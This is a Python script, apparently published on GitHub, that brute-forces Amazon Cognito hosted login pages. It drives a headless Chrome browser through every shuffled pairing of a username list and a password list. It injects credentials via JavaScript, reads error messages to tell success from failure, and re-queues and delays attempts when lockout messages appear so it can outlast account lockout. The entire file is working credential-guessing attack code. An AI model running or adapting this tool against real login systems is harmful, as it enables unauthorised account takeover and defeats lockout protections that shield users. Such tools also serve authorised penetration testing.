# Author: Daniel Antonsen @root4loot
# GitHub: https://github.com/root4loot

import argparse
from collections import deque
from itertools import product
from random import shuffle
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def setup_driver(proxy_address=None):
    chrome_options = Options()
    if proxy_address:
        chrome_options.add_argument(f'--proxy-server={proxy_address}')

    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument("--window-size=1920x1080")
    
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def shuffle_attempts(email_list, password_list):
    attempts = list(product(email_list, password_list))
    shuffle(attempts)
    return deque(attempts)

def attempt_login(base_url, email_list_file, password_list_file, proxy_address=None):
    driver = setup_driver(proxy_address)
    delay = 180000  # 3 minutes
    attempts_queue = deque()
    consecutive_failures = 0

    with open(email_list_file, 'r') as emails_file, open(password_list_file, 'r') as passwords_file:
        email_list = emails_file.read().splitlines()
        password_list = passwords_file.read().splitlines()

        attempts_queue = shuffle_attempts(email_list, password_list)

    total_attempts = len(email_list) * len(password_list)
    remaining_attempts = total_attempts

    while attempts_queue:
        email, password = attempts_queue.popleft()

        driver.delete_all_cookies()
        driver.get(base_url)
        # Ensure the page is loaded
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

        # Force a refresh if needed
        driver.refresh()
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

        js_email_input = f'document.querySelector("#signInFormUsername").value="{email}";'
        js_password_input = f'document.querySelector("#signInFormPassword").value="{password}";'
        js_submit_form = 'document.querySelector("input[name=\'signInSubmitButton\']").click();'

        driver.execute_script(js_email_input)
        driver.execute_script(js_password_input)
        driver.execute_script(js_submit_form)

        time.sleep(2)  # Allow time for the server to process the login attempt

        try:
            error_message_element = driver.find_element(By.ID, "loginErrorMessage")
            error_message = error_message_element.get_attribute("innerHTML").strip()
            if not error_message:
                error_message = error_message_element.get_attribute("innerText").strip()

            if "Password attempts exceeded" in error_message:
                print(f"Login failed for {email} with password {password}: {error_message}")
                consecutive_failures += 1
                delay = delay * (2 ** (consecutive_failures - 1))
                attempts_queue.append((email, password))  # Add failed attempt back to the queue for retry
            else:
                print(f"Login failed for {email} with password {password}: {error_message}")

        except NoSuchElementException:
            if "dashboard" in driver.current_url:
                print(f"Login success for {email} with password {password}")
                continue
            else:
                print(f"Login unclear for {email} with password {password}: Check manually")
                continue

        if len(email_list) > 1:
            delay /= len(email_list)

        remaining_attempts -= 1
        remaining_time_milliseconds = remaining_attempts * delay
        remaining_time_seconds = remaining_time_milliseconds / 1000
        remaining_time_minutes = remaining_time_seconds / 60
        print(f"Estimated time remaining: {remaining_time_minutes:.2f} minutes")

        if consecutive_failures == 0:
            print(f"Sleeping for {delay:.1f} seconds (normal)")
        else:
            print(f"Sleeping for {delay:.1f} seconds (lockout)")

        time.sleep(delay / 1000)

        consecutive_failures = 0

    driver.quit()

def main():
    parser = argparse.ArgumentParser(description='Amazon Cognito Bruteforcer. Github: https://github.com/root4loot/cognito-brute-force')
    parser.add_argument('url', help='Base URL for login')
    parser.add_argument('username_file', help='File containing usernames')
    parser.add_argument('password_file', help='File containing passwords')
    parser.add_argument('--proxy', help='Proxy address (optional)', default=None)
    
    args = parser.parse_args()

    attempt_login(args.url, args.username_file, args.password_file, args.proxy)

if __name__ == "__main__":
    main()
